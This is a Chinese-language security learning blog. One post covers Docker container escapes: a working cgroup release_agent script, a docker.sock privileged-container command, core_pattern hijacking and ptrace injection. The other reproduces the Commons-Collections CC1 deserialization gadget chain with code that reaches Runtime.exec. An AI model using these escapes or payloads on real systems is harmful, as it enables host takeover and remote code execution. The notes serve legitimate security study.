<p>简单的理解，比如这个Mount进行隔离，Linux存在一个系统调用叫做chroot，顾名思义就是更改系统的根目录。只要我将根目录修改到某个子目录下，那么chroot后的文件系统就无法访问到该子目录外部的内容。<br>剩下的资源也是由类似的模式进行了隔离</p>
<p>单独隔离PID时，虽然新开进程在自己的命名空间中会成为1号进程，但仍能通过ps等命令查看全部进程，这是由于ps读取的是&#x2F;proc目录，需要通过文件系统(Mount)的隔离才能进一步屏蔽</p>
<p>通过<code>ls -l /proc/$pid/ns | awk &#39;&#123;print $1, $9, $10, $11&#125;&#39;</code>可以看到对应进程所属的命名空间</p>
<h4 id="clone-unshare-amp-setns"><a href="#clone-unshare-amp-setns" class="headerlink" title="clone,unshare&amp;setns"></a>clone,unshare&amp;setns</h4><p>三个和命名空间相关的系统调用，clone起一个新的线程，通过参数设置命名空间的隔离，unshare使进程脱离某个命名空间，setns则将进程加入到某个命名空间</p>
<h3 id="Linux-CGroup"><a href="#Linux-CGroup" class="headerlink" title="Linux CGroup"></a>Linux CGroup</h3><p>但即使有了命名空间，只是使得不同进程之间的资源互不影响，并不能限制单个进程对计算机全局资源的占用，因此还需要一个新的东西进行控制，也就是Linux Control Group，用于限制控制和分离一个进程组群的资源（CPU，内存，硬盘）占用</p>
<h3 id="Rootless-Docker"><a href="#Rootless-Docker" class="headerlink" title="Rootless Docker"></a>Rootless Docker</h3><p>Linux中的隔离容器是基于Linux命名空间的实现的。而创建命名空间需要特权，Docker的基础——挂载文件系统同样也需要特权，所以Docker服务通常都是需要root用户启动的<br>后来人们开发出来Rootless Docker，即不需要特权也能运行的docker，不过这个docker多多少少比普通docker少些功能</p>
<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现的关键是利用用户命名空间(<code>user namespace</code>)，上面有提到过Linux3.8之后用户命名空间不需要特权也能创建。用户命名空间可以映射一系列的用户ID，使得内层容器的特权用户(root)映射在外层命名空间时变为普通用户，而Rootless Docker则同时将docker daemon也重新映射到了用户命名空间<br>说白了就是能用非特权用户能创建命名空间了所以也能实现隔离了呗？（猜的）</p>
<h3 id="x2F-var-x2F-run-x2F-docker-sock"><a href="#x2F-var-x2F-run-x2F-docker-sock" class="headerlink" title="&#x2F;var&#x2F;run&#x2F;docker.sock"></a>&#x2F;var&#x2F;run&#x2F;docker.sock</h3><p>socket一般分为两种，Internet domain socket和Unix domain socket，前者就是我们常说的网络通信socket，基于网络协议，而后者则只能用于进程间通信，基于文件系统<br>docker提供了一个Unix socket支持docker API调用，使用HTTP请求通过docker.sock发送给Docker daemon，使用它，我们就可以运行一些能够管理Docker的Docker容器，比如Portainer、Kubernetes<br><strong>绑定Docker套接字之后，容器的权限会很高，可以控制Docker daemon。</strong></p>
<h3 id="docker-run参数选项"><a href="#docker-run参数选项" class="headerlink" title="docker run参数选项"></a>docker run参数选项</h3><p><code>docker run [OPTIONS]</code>可以让用户完全控制容器的生命周期，并允许用户覆盖执行<code>docker build</code>时所设定的参数，甚至也可以修改本身由Docker所控制的内核级参数。</p>
<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><h3 id="privileged容器内mount-device"><a href="#privileged容器内mount-device" class="headerlink" title="privileged容器内mount device"></a>privileged容器内mount device</h3><p>应该是最经典的docker逃逸，首先需要docker以privileged模式运行<br>当<code>docker run</code>时加上<code>--privileged</code>这个参数，会使得该容器拥有宿主机root权限，设计时最大的用途应该是允许在该容器内再开容器，该类型的docker由于其权限可以看到宿主机上的磁盘等设备，且允许重新挂载目录<br>通过<code>fdisk -l</code>命令查看磁盘文件，非privileged的docker将无法看到磁盘<br>因此privileged容器最常用的逃逸方式就是讲宿主机的根目录挂载进容器内部，对宿主机进行任意文件读写，通过修改crontab，root的authorized_keys等文件完成逃逸</p>
<h3 id="cap-add-SYS-ADMIN"><a href="#cap-add-SYS-ADMIN" class="headerlink" title="--cap-add SYS_ADMIN"></a>--cap-add SYS_ADMIN</h3><p>Linux内核在2.2版本后引入capabilities机制，允许普通用户执行特权用户才能执行的命令。<br>截至Linux 3.0版本，Linux中共有38种capabilities。Docker容器默认限制为14个capabilities，管理员可以使用--cap-add和--cap-drop选项为容器精确配置capabilities。<br>当docker以privileged模式启动时直接赋予全部capabilities，而add一个SYS_ADMIN的capabilities也允许容器进行挂载等操作，同样可以进行上述利用</p>
<h3 id="cgroup-release-agent"><a href="#cgroup-release-agent" class="headerlink" title="cgroup release_agent"></a>cgroup release_agent</h3><p>同样需要上述挂载权限，这个应该是一个更不容易被检测的逃逸方法？<br>使用<code>mount -t cgroup -o memory cgroup $mountdir</code>进行挂载<br><del>这几个参数我反正是看不懂，也查不到有用的内容</del></p>
<h4 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h4><p>使用<code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab</code>命令可以得到当前容器根目录在宿主机中的位置，实现宿主机和容器直接的文件共享（把执行命令的结果写进这个文件就可以在容器内看见）<br><code>/etc/mtab</code>文件记录当前的分区挂载情况，不过在没有额外权限的容器内该命令也能获得其在宿主机的目录位置</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>使用一个现成脚本修改Cgroup的release_agent在宿主机中执行命令<br><a href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">privileged&#x2F;1-host-ps.sh</a></p>
<pre class=" language-shell"><code class="language-shell">#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"
</code></pre>
<h4 id="另一种做法"><a href="#另一种做法" class="headerlink" title="另一种做法"></a>另一种做法</h4><p>或者用这个命令挂载<code>mount -t cgroup -o devices devices $mountdir</code><br><del>这两个命令挂载完之后的目录结构好像没什么区别。。。我感觉就是挂载了同样的东西</del><br>挂载后有一个docker目录，其中存的有全部docker容器的Cgroup配置，找到自己容器id对应的文件夹，通过<code>echo a &gt; $mountdir/docker/$dockerID/devices.allow</code>使容器可以访问全部类型的设备<br>使用<code>mknod</code>创建设备文件，并使用<code>debugfs</code>进行访问，再次获取读写宿主机任意文件的权限</p>
<pre class=" language-shell"><code class="language-shell">mknod name b 252 1
debugfs -w name
</code></pre>
<h5 id="mknod参数"><a href="#mknod参数" class="headerlink" title="mknod参数"></a>mknod参数</h5><p>mknod的参数还是需要讲一下的，一开始没注意导致复现失败了<br>参数分别是</p>
<ul>
<li>文件名：要创建的设备文件名；</li>
<li>类型：指定要创建的设备文件的类型；</li>
<li>主设备号：指定设备文件的主设备号；</li>
<li>次设备号：指定设备文件的次设备号。<br>文件名随便起，类型照抄应该也没事，主次设备号是需要自己去翻一下&#x2F;dev文件夹上那块文件系统的硬盘设备号的，因为是特权容器所以容器内的&#x2F;dev就是宿主机的&#x2F;dev，<code>ls -l</code>对应的文件一下就能看见</li>
</ul>
<h3 id="特殊路径挂载"><a href="#特殊路径挂载" class="headerlink" title="特殊路径挂载"></a>特殊路径挂载</h3><p>直接把宿主机的关键文件挂载到docker里来，那就能直接改了。当然大家一般来说不会这么傻</p>
<h4 id="Docker-in-Docker-docker-sock"><a href="#Docker-in-Docker-docker-sock" class="headerlink" title="Docker in Docker(docker.sock)"></a>Docker in Docker(docker.sock)</h4><p>特殊的常见情形（病句）<br>将宿主机的&#x2F;var&#x2F;run&#x2F;docker.sock挂载进容器内，这样子这个docker就可以通过和docker.sock通信在宿主机内创建任意配置的docker（包括前文的privileged），管理任意容器，这种操作叫Docker in docker（虽然感觉和名字并不是很符合）<br>在新开一个privileged容器就可以再利用上面的办法打通了<br><code>./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it —rm —name rshell -v &quot;/proc:/host/proc&quot; -v &quot;/sys:/host/sys&quot; -v &quot;/:/rootfs&quot; —network=host —privileged=true —cap-add=ALL alpine:latest</code><br>没装docker服务的话也可以试试curl？docker.sock是可以用http协议进行交互的</p>
<h4 id="容器挂载了-x2F-proc"><a href="#容器挂载了-x2F-proc" class="headerlink" title="容器挂载了&#x2F;proc"></a>容器挂载了&#x2F;proc</h4><p>利用linux的&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern文件，文末有参考链接<br>使用上面提到的trick从mount信息中找出宿主机对应当前容器内部文件结构的路径<br>在容器根目录下面写一个.sh文件，则宿主机对应目录下可以访问到该文件，又容器挂载了宿主机的&#x2F;proc目录，所以可以修改其<code>/proc/sys/kernel/core_pattern</code>文件<br>demo:<code>echo -e &quot;|/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh \rcore    &quot; &gt; /host_proc/sys/kernel/core_pattern</code><br>然后想办法触发一个segmentation fault使得我们的.sh脚本被执行即可（随便写个垃圾代码编译上传上去）<br>原理，Linux在进程崩溃时会将崩溃信息写入文件，写入的文件名为&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern中所配置的，若core_pattern的第一个字符为管道符，则会将报错信息传递给管道符后面的程序作为参数并执行该程序</p>
<h3 id="SYS-PTRACE"><a href="#SYS-PTRACE" class="headerlink" title="SYS_PTRACE"></a>SYS_PTRACE</h3><p>docker容器启动时加了一个<code>--cap-add=SYS_PTRACE</code>的时候可利用，容器如果需要调试什么的就需要添加这个权限，所以应该也比较常见？<br>可以使用<code>capsh --print</code>命令看当前容器的的capabilities（虽然我的容器里好像没有这个命令。。。。）<br>需要找到一个root权限的宿主机进程（大部分都是docker1号进程？），然后对该进程进行注入<br>使用<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">infect.c</a>进行注入，在目标机器上编译执行<code>./inject $pid</code>注入</p>
<h3 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h3><p>当容器和宿主机共享一个net namespace的时候可以利用<br>抄一个腾讯写好的工具<br><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn">https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn</a></p>
<h3 id="脏牛与VDSO"><a href="#脏牛与VDSO" class="headerlink" title="脏牛与VDSO"></a>脏牛与VDSO</h3><p>Linux超级远古的至尊漏洞，Dirty CopyOnWrite<br>利用写入时复制和条件竞争进行任意内存读写的超级漏洞<br>VDSO Virtual Dynamic Shared Object（虚拟动态共享对象）简单来说就是存在在内核空间的.so文件<br>在容器内打VDSO内存中的<code>clock_gettime()</code>进行逃逸<br>网上都有现成的工具</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://coolshell.cn/articles/17010.html">DOCKER基础技术：LINUX NAMESPACE（上）</a><br><a href="https://coolshell.cn/articles/17049.html">DOCKER基础技术：LINUX CGROUP</a><br><a href="https://www.docker.com/blog/experimenting-with-rootless-docker/">Experimenting with Rootless Docker</a><br><a href="http://dockone.io/article/152">Docker run 命令的使用方法</a><br><a href="https://xz.aliyun.com/t/1098">利用 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern隐藏系统后门</a><br><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">[Linux] Infecting Running Processes</a><br><a href="https://security.tencent.com/index.php/blog/msg/183">红蓝对抗中的云原生漏洞挖掘及利用实录</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Common-Collections系列payload复现</title>
    <url>/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="Common-Collections系列payload复现"><a href="#Common-Collections系列payload复现" class="headerlink" title="Common-Collections系列payload复现"></a>Common-Collections系列payload复现</h1><p>问就是太菜了，什么都不会，所以需要加强记忆，保姆级复习<br>代码基本上都是抄的yso，但是要手跟一下总结一下</p>
<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>最古老的payload，在极低版本的jdk上生效，因为已经修掉了所以现在基本上没有用，在这里可以下载远古jdk，这里用的1.8u51，非常远古<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><pre><code>Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
</code></pre>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer[]"></a>Transformer[]</h3><p>先看Transformer数组这一套，这个是后续利用的常客，Transformer是一个基类，其下拥有ChainedTransformer，ConstantTransformer，InvokerTransformer众多子类，其拥有一个transform方法，ChainedTransformer的该方法如下(ChainedTransformer有一个成员变量数组iTransformer)</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            object <span class="token operator">=</span> iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>就是以上一次transform的结果为参数，依次调用自己的各transformer的transform方法。<br>ConstantTransformer从名字上就能听出来，其transform方法返回一个常量，可在构造函数中传入该常量<br>InvokerTransformer的该方法比较牛逼，其在构造时可以传入需要调用的方法名iMethod和参数列表iParamTypes，直接进行反射调用</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
                
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>因此写出Transformer的部分代码</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>调用ChainedTransformer的transform方法，就先通过ConstantTransformer返回<code>Runtime.class</code>，然后利用invokeTransformer调用方法，先调用getMethod方法，获取到Runtime类的getRuntime Method，之后对使用invoke调用Method对象，返回Runtime类实例，最终调用Runtime对象的exec方法进行命令执行。<br>也就等价于<code>Runtime.getRutime.exec(args)</code>。</p>
<h3 id="从AnnotationInvocationHandler-invoke到LazyMap-get"><a href="#从AnnotationInvocationHandler-invoke到LazyMap-get" class="headerlink" title="从AnnotationInvocationHandler.invoke到LazyMap.get"></a>从AnnotationInvocationHandler.invoke到LazyMap.get</h3><p>那么接下来的任务就是找到一个触发ChainedTransformer的transform方法的点了，这里看到LazyMap的get方法</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// create value for key if key is not currently in the map</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Object value <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>如果key不在map中的话，就调用factory属性的transform方法，OK<br>再找一个可以触发LazyMap的get方法的点，按照调用链层层往上，看到AnnotationInvocationHandler.invoke()</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">,</span> Method var2<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        String var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">equalsImpl</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var5<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span><span class="token string">"Too many parameters for an annotation method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">byte</span> var7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">switch</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1776922004</span><span class="token operator">:</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">147696667</span><span class="token operator">:</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    var7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">1444986633</span><span class="token operator">:</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    var7 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">switch</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token operator">:</span>
                Object var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>在switch(var7)的default选项中，进行了<code>Object var6 = this.memberValues.get(var4);</code>memberValues当然是一个map，符合条件</p>
<p>AnnotationInvocationHandler继承自InvocationHandler，而且需要调用其invoke方法，需要使用Proxy来触发这个invoke。</p>
<p>简单复习一下代理，一个Proxy需要实现一个继承自InvocationHandler的类，以及一个被代理的对象。Handler类定义一个invoke函数，并在实例化时关联该对象，对由该handler创建的proxy对象进行方法调用，即为调用该handler的invoke方法。而一般来说handler的invoke方法一般是对调用的方法进行包装</p>
<p>使用如下代码创建一个合适的Proxy类</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> InvocationHandler temp <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Map mapProxy <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>先构造好对应的LazyMap，由于AnnotationInvocationHandler的构造函数是私有方法，所以要通过反射来进行创建（为什么构造函数是私有方法啊，那这个类正常情况怎么用啊。。。）<br>将创建的handler与LazyMap进行关联，创建出可用的mapProxy对象</p>
